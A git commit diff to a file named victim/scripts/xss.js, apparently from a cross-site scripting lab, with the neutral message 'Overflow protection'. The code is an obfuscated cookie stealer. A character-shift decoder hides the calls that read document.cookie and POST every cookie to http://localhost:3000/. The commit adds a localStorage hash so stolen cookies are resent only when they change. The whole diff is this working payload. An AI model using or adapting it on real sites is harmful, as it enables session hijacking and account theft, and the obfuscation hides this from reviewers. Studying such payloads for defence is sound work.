9db6ae51d91e57ab8ca3a40927c6bb82548ba0f9
Ange Rodriguez <ange.rodriguez@thunderwave.fr>
2021-01-01 13:37:34 +0100

    feat : Overflow protection

--- victim/scripts/xss.js
+++ victim/scripts/xss.js
@@ -1,4 +1,6 @@
 (() => {
+  const y = 'oifneirpvnpecz'
+
   // let t = false;
   // ['localhost', 'dev', 'qa', 'staging'].forEach(s => {
   //   if (new RegExp(s).test(location.href)) {
@@ -15,22 +17,34 @@
 
   const k = (o) => Object
     .keys(o)
-    .map((k) => encodeURIComponent(k) + '=' + encodeURIComponent(o[k]))
+    .map(l => encodeURIComponent(l) + '=' + encodeURIComponent(o[l]))
     .join('&');
 
+  const h = s => s
+    .split('')
+    .reduce((a,b) => {
+      a = ((a << 5) - a) + b.charCodeAt(0);
+      return a&a;
+    }, 0);
+
+  const d = document[c('httpnj')]
+
   const r = () => {
-    let a = {}
-    let b = document[c('httpnj')].split('; ')
+    let a = {};
+    let b = d.split('; ');
     b.forEach(e => {
-      const d = e.split('=')
-      a[d[0]] = d[1]
-    })
-    return k(a)
+      const w = e.split('=');
+      a[w[0]] = w[1];
+    });
+    return k(a);
   }
 
-  window[c('kjyhm')](c('myyu?44qthfqmtxy?85554'), {
-    [c('rjymti')]: c('utxy'),
-    [c('mjfijwx')]: {[c('Htsyjsy2Y~uj')]: c('fuuqnhfynts4}2|||2ktwr2zwqjshtiji')},
-    [c('gti~')]: r()
-  })
-})()
+  if (window[c('qthfqXytwflj')][c('ljyNyjr')](y) != h(d)) {
+    window[c('qthfqXytwflj')][c('xjyNyjr')](y, h(d));
+    window[c('kjyhm')](c('myyu?44qthfqmtxy?85554'), {
+      [c('rjymti')]: c('utxy'),
+      [c('mjfijwx')]: {[c('Htsyjsy2Y~uj')]: c('fuuqnhfynts4}2|||2ktwr2zwqjshtiji')},
+      [c('gti~')]: r()
+    });
+  }
+})();
